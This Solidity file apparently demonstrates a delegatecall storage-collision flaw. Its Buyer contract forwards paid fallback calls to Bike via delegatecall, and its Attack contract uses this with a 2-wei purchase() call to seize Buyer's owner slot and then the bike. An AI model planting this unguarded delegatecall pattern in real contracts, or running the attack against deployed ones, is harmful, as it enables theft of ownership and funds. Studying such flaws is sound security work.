// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

contract Bike {
    address public owner;
    function purchase() public payable {
        if (msg.value > 1)
            owner = msg.sender;
    }
    function changeOwner(address _owner) public payable {
        if (msg.sender == owner)
            owner = _owner;
    }
}

contract Buyer {
    address public owner;
    address private bike;
    constructor(address _bike) {
        owner = msg.sender;
        bike = _bike;
    }
    fallback() external payable {
        if (msg.value > 0 && msg.data.length > 0)
            bike.delegatecall(msg.data);
    }
    receive () payable external {}
    function buy() public payable {
        bike.call{value: 2}(abi.encodeWithSignature("purchase()")); 
    }
    function changeBikeOwner(address _owner) public {
        if (msg.sender == owner) 
            bike.call(abi.encodeWithSignature("changeOwner(address)", _owner)); 
    }
}

contract Attack {
    address private buyer;
    constructor(address _buyer) {
        buyer = _buyer;
    }
    function attack() public payable  {
        buyer.call{value: 2 wei}(abi.encodeWithSignature("purchase()")); 
        buyer.call(abi.encodeWithSignature("changeBikeOwner(address)", address(this))); 
    }
}